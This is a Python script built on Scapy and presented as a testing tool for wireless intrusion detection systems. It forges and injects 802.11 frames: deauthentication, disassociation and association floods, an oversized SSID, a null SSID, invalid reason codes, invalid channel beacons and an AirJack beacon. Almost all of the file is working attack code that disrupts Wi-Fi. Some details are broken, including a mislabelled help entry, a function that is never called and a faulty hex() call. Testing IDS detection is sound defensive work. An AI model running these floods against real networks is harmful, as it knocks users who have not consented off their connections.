#!/usr/bin/env python
# encoding: utf-8
"""

Created by Jaime Blasco on 2009-10-17.
Copyright (c) 2009 Alienvault. All rights reserved.
"""

import sys
import getopt
from scapy.all import *

help_message = "WIDSTT - Wireless Intrusion Detection Systems Testing Tool  (jaime.blasco@alienvault.com)\n" \
			   "Usage: \n\t-i interface\n\t-m module" \
			   "\tnullProbe\tSend Probe-response packets with a SSID IE tag component of length 0 (WVE-2006-0064)\n" \
			   "\t\t\tdisassociateFlood\t Floods the WLAN with disassociation packets. (WVE-2005-0046)\n" \
			   "\t\t\tdeauthFlood\t Floods the WLAN with deauthentication packets. (WVE-2005-0045 )\n" \
			   "\t\t\tassociateFlood\t Floods the WLAN with deauthentication packets. (WVE-2005-0045 )\n" \
			   "\t\t\tinvalidDeauthRcode\t Sends invalid deauthentication reason code.\n" \
			   "\t\t\tinvalidDisasRcode\t Sends invalid disassociation reason code.\n" \
			   "\t\t\tlongSSID\t Sends an over-sized SSID. (WVE-2006-0071, WVE-2007-0001)\n" \
			   "\t\t\tairJack\t Sends airjack beacon packet. (WVE-2005-0018)\n" \
			   "\t\t\tinvalidChannellBeacon\t Sends an an invalid channel number in beacon frames (WVE-2006-0050)\n" \
			   "\t\t\twindowsZero\t Windows XP SP1 behaviour\n"
			
modules = ("nullProbe", "disassociateFlood", "deauthFlood", "associateFlood", "invalidDeauthRcode", "invalidDisasRcode", "longSSID", "airJack", "invalidChannellBeacon", "windowsZero")


def RandMAC(template="*"):
    template += ":*:*:*:*:*"
    template = template.split(":")
    mac = ()
    for i in range(6):
        if template[i] == "*":
            v = RandByte()
        elif "-" in template[i]:
            x,y = template[i].split("-")
            v = RandNum(int(x,16), int(y,16))
        else:
            v = int(template[i],16)
        mac += (v,)
    return "%02x:%02x:%02x:%02x:%02x:%02x" % mac

def invalidDeauthRcode(interface):

	station = RandMAC()
	bssid = RandMAC()

	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=500)
	sendp(frame, iface = interface)
	
def invalidDisasRcode(interface):

	station = RandMAC()
	bssid = RandMAC()

	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Disas(reason=500)
	sendp(frame, iface = interface)
	
def disassociateFlood(interface):
	station = RandMAC()
	bssid = RandMAC()
	
	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Disas(reason=9)
	
	for i in range(0, 200):
		sendp(frame, iface = interface, loop=0)

def associateFlood(interface):
	station = RandMAC()
	bssid = RandMAC()
	
	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11AssoReq()
	
	for i in range(0, 200):
		sendp(frame, iface = interface, loop=0)

def authFlood(interface):
	station = RandMAC()
	bssid = RandMAC()
	
	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Auth()
	
	for i in range(0, 200):
		sendp(frame, iface = interface, loop=0)
		
def deauthFlood(interface):
	station = RandMAC()
	bssid = RandMAC()
	
	frame = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=9)
	
	for i in range(0, 200):
		sendp(frame, iface = interface, loop=0)

def longSSID(interface):
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	dot11ProbeResp_frame = Dot11ProbeResp(cap="ESS")
	dot11Elt_frame = Dot11Elt(ID="SSID", len = 100, info = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
	pkt = (dot11_frame / dot11ProbeResp_frame / dot11Elt_frame)
	print pkt.show()
	sendp(pkt, iface = interface, loop=0);

def nullProbe(interface):
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	dot11ProbeResp_frame = Dot11ProbeResp(cap="ESS")
	dot11Elt_frame = Dot11Elt(ID="SSID", len = 0, info = 0x20)
	pkt = (dot11_frame / dot11ProbeResp_frame / dot11Elt_frame)
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)

def airJack(interface):
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	pkt = (Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="AirJack")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)

def invalidChannellBeacon(interface):
	#Channel 0
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	pkt = (Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="test")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\x00")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)	

	#Channel 255
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	pkt = (Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="test")/Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/Dot11Elt(ID="DSset",info="\xff")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
	print pkt.show()
	sendp(pkt, iface = interface, loop=0)		

def windowsZero(interface):
	dot11_frame = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())
	dot11ProbeReq_frame = Dot11ProbeReq()
	dot11Elt_frame = Dot11Elt(ID="SSID", len = 32, info = hex('\0x14\0x09\0x03\0x11\0x04\0x11\0x09\0x0e\0x0d\0x0a\0x0e\0x19\0x02\0x17\0x19\0x02\0x14\0x1f\0x07\0x04\0x05\0x13\0x12\0x16\0x16\0x0a\0x01\0x0a\0x0e\0x1f\0x1c\0x12'))
	pkt = (dot11_frame / dot11ProbeReq_frame / dot11Elt_frame)
	sendp(pkt, iface = interface, loop=0);

def usage():
	print help_message
	
def main(argv=None):
	
	module = None
	
	if argv is None:
		argv = sys.argv
		
	opts, args = getopt.gnu_getopt(sys.argv[1:], "m:i::")
	for option, value in opts:
		if option in ("-i", "--interface"):
			interface = value
		if option in ("-m", "--module"):
			module = value
			
	if not module or module not in modules:
		usage()
		return
	
	if module == "nullProbe":
		nullProbe(interface)
		
	if module == "disassociateFlood":
		disassociateFlood(interface)
		
	if module == "deauthFlood":
		deauthFlood(interface)
		
	if module == "invalidDeauthRcode":
		invalidDeauthRcode(interface)
	
	if module == "invalidDisasRcode":
		invalidDisasRcode(interface)
		
	if module == "longSSID":
		longSSID(interface)

	if module == "airJack":
		airJack(interface)
		
	if module == "invalidChannellBeacon":
		invalidChannellBeacon(interface)
	
	if module == "windowsZero":
		windowsZero(interface)
		
	if module == "associateFlood":
		associateFlood(interface)
		
	

if __name__ == "__main__":
	main()
